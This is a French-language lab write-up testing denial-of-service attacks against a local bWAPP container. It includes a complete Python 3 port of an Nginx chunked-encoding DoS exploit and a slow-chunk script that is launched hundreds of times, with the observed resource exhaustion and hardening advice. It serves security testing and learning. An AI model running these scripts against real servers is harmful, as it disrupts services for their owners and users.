# Étape 0 : Vérifications
Confirmer que le script est servi en HTTP et que la VM dispose d’un interpréteur Python compatible (script d’origine en **Python 2**).

## Sous‑étapes
### 1) Fichier présent dans le conteneur
docker exec -it bwapp bash -c "ls -l /app/evil/nginx_dos.py || ls -l /var/www/html/evil/nginx_dos.py"

### 2) Fichier servi par le web
curl -I http://127.0.0.1:8081/evil/nginx_dos.py

### 3) Présence de Python sur l’hôte/VM
which python3 || true
python3 --version 2>/dev/null || true

## Attendu
- **ls -l** affiche le fichier dans **/app/evil** (existe).
- **curl -I** renvoie **HTTP/1.1 200 OK**.
- **python2 --version** renvoie une version **2.x**.

## Observé
- Fichier présent et accessible via HTTP.
- **python3 3.12.3** disponible.

---

# Étape 1 : Attaque

Script converti pour exécution en **Python 3**, puis déroulé des tests.

## Sous‑étapes
### 1) Conversion du script
cat > /tmp/nginx_dos_py3_converted.py <<'PY'
#!/usr/bin/env python3
import http.client
import socket
import sys
import os

socket.setdefaulttimeout(1)
dos_packet = 0xFFFFFFFFFFFFFFEC
packet = 0

def chunk(data, chunk_size_hex):
    return f"{chunk_size_hex}\r\n{data}\r\n0\r\n\r\n"

if len(sys.argv) < 2:
    print("Usage: python3 nginx_dos_py3_converted.py host:port")
    print("Example: python3 nginx_dos_py3_converted.py 127.0.0.1:8081")
    sys.exit(1)

hostport = sys.argv[1].lower()
if ':' in hostport:
    host, port = hostport.split(':',1)
    try:
        port = int(port)
    except:
        port = 80
else:
    host = hostport
    port = 80

while packet <= 66:
    body = "beezzzzzzzzzz"
    chunk_size = hex(dos_packet + 1)[3:]
    chunk_size = ("F" + chunk_size[:len(chunk_size)-1]).upper()

    try:
        conn = http.client.HTTPConnection(host, port, timeout=2)
        url = "/bWAPP/portal.php"   # adapte si nécessaire
        conn.putrequest('POST', url)
        conn.putheader('User-Agent', 'bWAPP')
        conn.putheader('Accept', '*/*')
        conn.putheader('Transfer-Encoding', 'chunked')
        conn.putheader('Content-Type', 'application/x-www-form-urlencoded')
        conn.endheaders()
        conn.send(chunk(body, chunk_size).encode())
    except Exception as e:
        print("Connection error!", e)
        sys.exit(1)

    try:
        resp = conn.getresponse()
        print(resp.status, resp.reason)
    except Exception:
        print(f"[*] Knock knock, is anybody there ? ({packet}/66)")

    packet += 1
    conn.close()

print("[+] Done!")
PY
chmod +x /tmp/nginx_dos_py3_converted.py

### 2) Exécution
python3 /tmp/nginx_dos_py3_converted.py 127.0.0.1:8081 2>&1 | tee /tmp/nginx_dos_py3_run.log

### 3) Résultats clés
[*] Knock knock, is anybody there ? (0/66)
[…]
[*] Knock knock, is anybody there ? (66/66)
→ **Aucune réponse HTTP** ; requêtes chunked **mises en attente/ignorées**. Ça indique un comportement potentiellement vulnérable mais non concluant. On vérifie l'impact sur le serveur avant d'aller plus loin.

### 4) Inspection service et charge
#### Connexions vers le port web
sudo ss -tanp | grep ':8081'

#### Sockets et processus associés
sudo lsof -nP -iTCP:808

#### Charge CPU / mémoire (snapshot)
top -b -n1 | head -20

#### Afficher uniquement le conteneur bwapp
docker stats --no-stream bwapp

#### Nombre de fichiers ouverts par docker-proxy (adapter PID si besoin)
sudo ls -l /proc/$(pgrep -f docker-proxy | head -1)/fd | wc -l

#### Logs Apache dans le conteneur (si présents)
docker exec -it bwapp bash -c "tail -n 120 /var/log/apache2/error.log 2>/dev/null || tail -n 120 /app/logs/* 2>/dev/null || true"

#### Test de service
curl -I http://127.0.0.1:8081/portal.php

##### Résumé des observations
- **LISTEN** actif sur 0.0.0.0:8081 via **docker-proxy**.
- **Apache 2.4.7/PHP 5.5.9** opérationnel ; redirections **302 → login.php**.
- **Pas d’erreur HTTP**, pas d’interruption de service.

### 5) Test de charge contrôlé (slow chunk)
Un seul envoi peut être ignoré. Il faut ouvrir plusieurs connexions lentes simultanées pour vérifier si le serveur épuise les workers/descripteurs.

#### 1) Nouveau script
    cat > /tmp/test_chunk_slow.py <<'PY'
    #!/usr/bin/env python3
    import socket, time, sys
    HOST="127.0.0.1"; PORT=8081
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.settimeout(5)
    try:
    s.connect((HOST,PORT))
    except Exception as e:
    print("conn fail", e); sys.exit(1)
    req = (
    "POST /portal.php HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    "User-Agent: trickle-chunk\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    )
    s.sendall(req.encode())
    s.sendall(b"10000000\r\n")
    try:
    while True:
        s.sendall(b"A")    # 1 octet toutes les 3s
        time.sleep(3)
    except Exception as e:
    print("ended", e)
    finally:
    s.close()
    PY
    chmod +x /tmp/test_chunk_slow.py

#### 2) 20 lancements
for i in $(seq 1 20); do python3 /tmp/test_chunk_slow.py & sleep 0.1; done

##### 3) Observation
sudo ss -tanp | grep ':8081' | sed -n '1,60p'
sudo lsof -nP -iTCP:8081
docker stats --no-stream bwapp
top -b -n1 | head -20

##### 4) Résultats clés
- ~**20 ESTABLISHED** vers **127.0.0.1:8081**.
- **bwapp** : PIDs **27 → 50**.
- Impact **faible**, service **OK**.

#### 2) 200 lancements
for i in $(seq 1 200); do python3 /tmp/test_chunk_slow.py >/dev/null 2>&1 & sleep 0.05; done

##### 3) Observation
sudo ss -tanp | grep ':8081' | sed -n '1,60p'
sudo lsof -nP -iTCP:8081
docker stats --no-stream bwapp
top -b -n1 | head -20

##### 4) Résultats clés
- **Centaines** de sockets **ESTABLISHED** → **127.0.0.1:8081**.
- **docker-proxy** : **centaines de FDs** ouverts.
- **bwapp** : PIDs **≈128**.
- **CPU user+sys élevé**, **mémoire serrée**, **swap utilisé**.
- Apache répond encore (**302**), **service dégradé** mais **vivant**.

### 6) Arrêt propre
pkill -f nginx_dos_py3_converted.py || pkill -f nginx_dos.py
sudo ss -K dst 127.0.0.1 dport = 8081 || true

---

# Conclusion
- Le PoC initial cible une vulnérabilité **Nginx** absente de l’environnement testé (**Apache derrière docker-proxy**).
- Les requêtes **chunked malformées** entraînent des **timeouts** sans erreur HTTP explicite.
- Le scénario **slow‑chunk** concurrent provoque un **épuisement progressif de ressources** : sockets ESTABLISHED nombreux, FDs docker‑proxy en hausse, PIDs conteneur en hausse, CPU et mémoire sous tension.
- Effet final : **dégradation** mesurable mais **pas de panne totale**.

**Lecture recommandée** : régler timeouts côté proxy/serveur, limiter le nombre de connexions par IP, activer request body rate‑limit et protéger les files d’attente (worker limits, `KeepAliveTimeout`, `RequestReadTimeout`, QoS réseau).